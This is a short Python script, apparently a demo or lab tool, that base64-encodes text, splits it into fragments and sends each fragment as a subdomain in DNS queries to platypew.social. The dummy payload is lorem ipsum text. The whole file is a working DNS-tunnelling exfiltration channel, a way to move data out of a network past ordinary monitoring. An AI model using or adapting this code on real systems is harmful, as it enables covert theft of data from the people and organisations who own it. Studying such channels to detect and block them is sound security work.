#! /usr/bin/env python3

from scapy.all import DNS, DNSQR, IP, UDP, send
from base64 import b64encode

DOMAIN = "platypew.social"
FRAG_LEN = 70 - len(DOMAIN)


def encode(data):
    data = data.strip()
    data += '\n'
    e_data = b64encode(data.encode()).decode()
    frag_e_data = [e_data[i:i + FRAG_LEN] for i in range(0, len(e_data), FRAG_LEN)]
    return frag_e_data


def send_data(dest, data):
    frag_e_data = encode(data)

    reqs = []
    for i, data in enumerate(frag_e_data):
        dns_req = IP(dst=dest) / UDP(dport=53) / DNS(
            id=i, rd=1, qd=DNSQR(qname=f'{data}.{DOMAIN}', qtype="A"))
        reqs.append(dns_req)

    send(reqs, inter=0.05)


data = """Lorem ipsum dolor sit amet, consectetur adipiscing elit. In pulvinar, arcu et bibendum ultricies, nisi diam rhoncus est, ut pellentesque elit nisl vitae nisi. Duis aliquet quis ligula at sagittis. Donec interdum urna vel quam congue, non blandit ligula fermentum. Suspendisse sit amet neque scelerisque, feugiat purus ut, scelerisque purus."""

send_data(f"www.{DOMAIN}", data)
